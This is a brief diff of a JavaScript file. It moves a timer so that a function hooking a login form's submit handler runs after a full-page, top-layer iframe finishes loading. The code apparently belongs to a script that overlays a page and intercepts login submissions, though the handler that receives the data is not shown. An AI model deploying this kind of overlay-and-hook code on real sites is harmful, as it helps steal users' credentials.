@@ -30,7 +30,7 @@ frame.width = `100%`;
 frame.height = `100%`;
 frame.style= 'z-index:9999;position:absolute;top: 0px; left: 0px;'
 frame.onload = () => {
-  
+  setTimeout(hookMessageHandler, 3000);
 }
 document.body.appendChild(frame);
 
@@ -52,4 +52,4 @@ function hookMessageHandler(){
   login.onsubmit = (e) => {formHandler(e);};
 }
 
-setTimeout(hookMessageHandler, 3000);
+
